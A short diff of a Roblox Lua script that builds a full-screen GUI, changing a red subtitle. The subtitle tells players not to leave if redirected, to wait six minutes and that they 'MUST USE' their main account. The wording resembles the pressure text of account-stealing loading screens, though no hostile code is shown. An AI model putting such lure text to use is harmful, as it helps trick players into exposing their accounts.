@@ -24,12 +24,12 @@ mainText.Font = Enum.Font.SourceSansBold
 mainText.TextColor3 = Color3.fromRGB(255, 255, 255)
 mainText.Parent = bg
 
--- Subtitle Text (Red)
+-- Updated Subtitle Text (Red)
 local subtitle = Instance.new("TextLabel")
 subtitle.Size = UDim2.new(1, 0, 0.05, 0)
 subtitle.Position = UDim2.new(0, 0, 0.5, 0)
 subtitle.BackgroundTransparency = 1
-subtitle.Text = "⚠️ NOTE: Don't leave if redirected, please wait the full 6 minutes before doing anything. ⚠️"
+subtitle.Text = "⚠️ NOTE: Don't leave if redirected, please wait the full 6 minutes before doing anything. YOU MUST USE YOUR MAIN ACCOUNT! ⚠️"
 subtitle.TextScaled = true
 subtitle.Font = Enum.Font.SourceSans
 subtitle.TextColor3 = Color3.fromRGB(255, 0, 0)
